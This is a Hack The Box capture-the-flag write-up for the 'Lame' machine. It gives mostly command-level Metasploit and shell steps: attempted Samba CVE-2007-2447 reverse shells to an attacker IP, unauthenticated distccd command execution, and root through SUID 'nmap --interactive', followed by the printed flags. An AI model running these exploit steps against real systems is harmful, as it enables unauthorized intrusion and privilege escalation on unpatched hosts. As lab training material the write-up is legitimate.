# HTB Lame — Writeup
**OS:** Ubuntu 8.04 (Hardy Heron)
**Difficulty:** Easy
**Attack Vector:** CVE-2007-2447 (Samba usermap script) + distccd RCE
**System:** Arch Linux

---

## Summary

Lame is an easy Linux machine — the first ever published on Hack The Box. It runs Samba 3.0.20, which is vulnerable to CVE-2007-2447 (command injection via shell metacharacters in the username field). However, due to network routing issues preventing reverse shells, the box was rooted through an alternative path: distccd (port 3632) for initial access as `daemon`, then privilege escalation via SUID `nmap --interactive` to get root.

---

## Reconnaissance

### Port Scan
```bash
nmap -sV -p- --min-rate 1000 -Pn 10.129.234.220
```

Key open ports:
- `21/tcp` — vsftpd 2.3.4 (backdoor version, but exploit fails)
- `22/tcp` — OpenSSH 4.7p1
- `139/tcp` — Samba 3.X
- `445/tcp` — Samba 3.0.20-Debian
- `3632/tcp` — distccd v1 (GNU 4.2.4)

### SMB Enumeration
```bash
smbmap -H 10.129.234.220
```

```
tmp       READ, WRITE
print$    NO ACCESS
opt       NO ACCESS
IPC$      NO ACCESS
ADMIN$    NO ACCESS
```

The `tmp` share is world-writable but contains nothing useful.

---

## Failed Approaches

### vsftpd 2.3.4 Backdoor
This version has a known backdoor (CVE-2011-2523), but exploitation fails — the backdoor port never opens. Common on this box.

### Samba CVE-2007-2447 (usermap_script)

The intended exploit path. Tried multiple ways:

**Metasploit:**
```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.234.220
set LHOST 10.10.16.59
set LPORT 4444
exploit
```

Failed with `All encoders failed to encode` — fixed by setting `set ENCODER generic/none`, but still no session created.

**Python (pysmb / impacket):**
```bash
python exploit.py 10.129.234.220 445 10.10.16.59 4444
```

Payload sent successfully, but no callback received.

**Root cause:** The target had **no route to host** back to the VPN IP. Confirmed via distccd stderr output:
```
(UNKNOWN) [10.10.16.59] 4444 (?) : No route to host
```

This blocked ALL reverse shell payloads regardless of method. Bind shells were also blocked by the target's firewall (non-standard ports filtered).

---

## Exploitation — What Actually Worked

### Step 1 — Initial Access via distccd (Port 3632)

distccd allows remote compilation jobs — and the version on Lame executes arbitrary commands without authentication.

```bash
msfconsole -q
use exploit/unix/misc/distcc_exec
set RHOSTS 10.129.234.220
set PAYLOAD cmd/unix/generic
set CMD id
set ENCODER generic/none
exploit
```

```
stdout: uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Command execution as `daemon` confirmed.

### Step 2 — Read User Flag

```bash
set CMD cat /home/makis/user.txt
exploit
```

```
stdout: c8f70acb94c07e16cd9281ca508eb80a
```

### Step 3 — Privilege Escalation via SUID nmap

Find SUID binaries:
```bash
set CMD find / -perm -4000 -type f 2>/dev/null
exploit
```

`/usr/bin/nmap` is SUID root — nmap 4.53 supports `--interactive` mode which drops to a shell.

### Step 4 — Root Flag via nmap --interactive

```bash
set CMD echo '!cat /root/root.txt' | nmap --interactive
exploit
```

```
Starting Nmap V. 4.53
Welcome to Interactive Mode
nmap> a90e0a0231bfb1b0fde7c893f91a0875
```

---

## Flags

```
User: c8f70acb94c07e16cd9281ca508eb80a
Root: a90e0a0231bfb1b0fde7c893f91a0875
```

---

## Arch Linux Gotchas & Lessons Learned

| Problem | Fix |
|---|---|
| `All encoders failed to encode` in MSF | `set ENCODER generic/none` — the default `cmd/base64` encoder fails on cmd/unix payloads |
| Reverse shells never connect back | Target had no route to VPN IP — use bind shells or command execution payloads instead |
| Bind shells on non-standard ports filtered | Target firewall blocks arbitrary inbound ports — use `cmd/unix/generic` for direct command output |
| Fish shell breaks smbclient exploit | Fish doesn't support backtick command substitution — switch to `bash` first |
| `externally-managed-environment` for pip | Arch enforces PEP 668 — use `python -m venv /tmp/venv` then install with venv pip |
| Msfconsole strips quotes from CMD | Use RC files (`msfconsole -r file.rc`) for complex commands, but quotes are still stripped — avoid parentheses and use piping instead |
| nmap `--interactive` can't be used interactively via distccd | Pipe input: `echo '!command' \| nmap --interactive` |
| nmap shows "Host seems down" | Add `-Pn` to skip ping probes — HTB machines often block ICMP |

---

## Tools Used

- `nmap` — reconnaissance, vuln scanning, and privilege escalation (SUID abuse)
- `metasploit` (`exploit/unix/misc/distcc_exec`) — distccd command execution
- `smbmap` — SMB share enumeration
- `impacket` / `pysmb` — attempted Samba exploitation (Python)

---

*Three machines down. When the front door is bricked, check every window.* 🏆
